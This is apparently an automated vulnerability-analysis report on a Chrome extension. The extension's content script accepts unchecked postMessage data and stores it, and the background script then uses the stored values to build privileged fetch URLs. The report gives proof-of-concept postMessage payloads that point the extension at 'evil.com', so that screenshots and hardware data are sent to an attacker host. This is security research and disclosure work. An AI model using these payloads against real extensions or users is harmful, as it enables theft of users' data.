# CoCo Analysis: jahggpkijlbfbbfdlikbfahkbooplfff

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 19 (1 storage sink + 18 fetch sinks, but all part of same vulnerability pattern)

---

## Sink 1: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jahggpkijlbfbbfdlikbfahkbooplfff/opgen_generated_files/cs_0.js
Line 472    window.addEventListener('message', async function (event) {
Line 474    if (event.data.source == "extinit") {
Line 544    value: event.data.value,

**Code:**

```javascript
// Content script (cs_0.js) - Lines 472-533
window.addEventListener('message', async function (event) {  // ← attacker can postMessage
    if (event.data.source == "extinit") {  // ← attacker controls event.data
        if (event.data.type == "setlocalstorage") {
            console.dir(" $Ext$ cs: setlocalstorage: event.data.key: " + JSON.stringify(event.data.key, null, 4));
            let promises = [];
            for (const ekey in event.data.key) {  // ← attacker-controlled keys
                promises.push(
                    new Promise(async (resolve, reject) => {
                        let obj = {};
                        obj[ekey] = event.data.key[ekey];  // ← attacker-controlled data
                        chrome.storage.local.set(obj, function () {  // Storage poisoning
                            resolve();
                        });
                    })
                )
            };
            await Promise.all(promises);
            event.source.postMessage({
                source: "content",
                type: "setlocalstorage",
                originmarker: event.data.originmarker,
                value: event.data.key
            }, event.origin);
        }
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// Attacker webpage can poison storage with malicious values
window.postMessage({
    source: "extinit",
    type: "setlocalstorage",
    key: {
        "customername": "attacker",
        "domain": "evil.com",
        "reseller": "malicious"
    }
}, "*");
```

**Impact:** Attacker can poison chrome.storage.local with arbitrary key-value pairs. This poisoned data is then used in subsequent fetch operations (see Sinks 2-19 below), allowing the attacker to control the destination URL for privileged cross-origin requests.

---

## Sinks 2-19: cs_window_eventListener_message → fetch_resource_sink

**CoCo Trace (example):**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jahggpkijlbfbbfdlikbfahkbooplfff/opgen_generated_files/cs_0.js
Line 472    window.addEventListener('message', async function (event) {
Line 474    if (event.data.source == "extinit") {
Line 544    value: event.data.value,

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jahggpkijlbfbbfdlikbfahkbooplfff/opgen_generated_files/bg.js
Line 988    if (b_lsObj.customername !== null && typeof b_lsObj.customername !== "undefined" && b_lsObj.customername !== "" && b_lsObj.domain !== null && typeof b_lsObj.domain !== "undefined" && b_lsObj.domain !== "") {
Line 1455/1458    _domurl = b_lsObj.customername + "." + b_lsObj.reseller + "." + b_lsObj.domain; (or without reseller)
Line 1460    let url = viprotocol + "://" + _domurl + "/FileManagement.svc/SaveStringInFile";

**Code:**

```javascript
// Content script (cs_0.js) - Complete flow from postMessage to storage
window.addEventListener('message', async function (event) {  // ← attacker entry point
    if (event.data.source == "extinit") {
        if (event.data.type == "setlocalstorage") {
            for (const ekey in event.data.key) {  // ← attacker-controlled
                let obj = {};
                obj[ekey] = event.data.key[ekey];  // ← customername, domain, reseller
                chrome.storage.local.set(obj, function () {});  // Poisoned storage
            }
        }
    }
    else if (event.data.source == "misalive") {
        chrome.runtime.sendMessage({  // ← forwards to background
            source: 'content',
            name: event.data.name,
            value: event.data.value,  // ← attacker-controlled
        });
    }
});

// Background script (bg.js) - Retrieves poisoned storage and uses in fetch
async function SendHWStatus() {
    if (b_jwt !== "") {
        // b_lsObj is loaded from storage (CheckSetVariables function)
        let _domurl = "";
        if (b_lsObj.reseller !== "") {
            _domurl = b_lsObj.customername + "." + b_lsObj.reseller + "." + b_lsObj.domain;  // ← attacker-controlled
        } else {
            _domurl = b_lsObj.customername + "." + b_lsObj.domain;  // ← attacker-controlled
        }
        let url = viprotocol + "://" + _domurl + "/FileManagement.svc/SaveStringInFile";  // ← attacker controls domain

        fetch(url, fetchConf)  // Privileged fetch to attacker-controlled domain
            .catch(function () {
                console.error(" $Ext$ bs: screenshot: Fetch failed")
            });
    }
}

// Similar patterns in:
// - Lines 1150-1155: SaveBase64ToJPG endpoint
// - Line 1460: SaveStringInFile endpoint
// Both use b_lsObj.customername, b_lsObj.domain, b_lsObj.reseller from poisoned storage
```

**Manifest permissions:**
```json
"permissions": ["activeTab", "tabs", "storage"],
"host_permissions": ["*://*/*", "<all_urls>"]
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage + Storage Poisoning → Privileged SSRF

**Attack:**

```javascript
// Step 1: Poison storage with attacker-controlled domain
window.postMessage({
    source: "extinit",
    type: "setlocalstorage",
    key: {
        "customername": "attacker",
        "domain": "evil.com",
        "reseller": "",
        "deviceid": "malicious-device"
    }
}, "*");

// Step 2: Trigger background operations that will use poisoned storage
// The extension's own logic will read from storage and make fetch() calls
// to attacker-controlled URL: https://attacker.evil.com/FileManagement.svc/SaveStringInFile
// or https://attacker.evil.com/FileManagement2.svc/SaveBase64ToJPG

// The extension has host_permissions "*://*/*" so it can make requests to any domain
```

**Impact:** Complete storage exploitation chain leading to privileged SSRF. Attacker can:
1. Poison chrome.storage.local with malicious domain values (customername, domain, reseller)
2. Extension's background script retrieves poisoned values and constructs URLs using attacker-controlled data
3. Extension makes privileged fetch() requests to attacker-controlled domains with extension's full host_permissions
4. Attacker receives sensitive data (screenshots via SaveBase64ToJPG, hardware status via SaveStringInFile) sent by the extension
5. This bypasses same-origin policy as the extension can make cross-origin requests to any domain with its elevated privileges
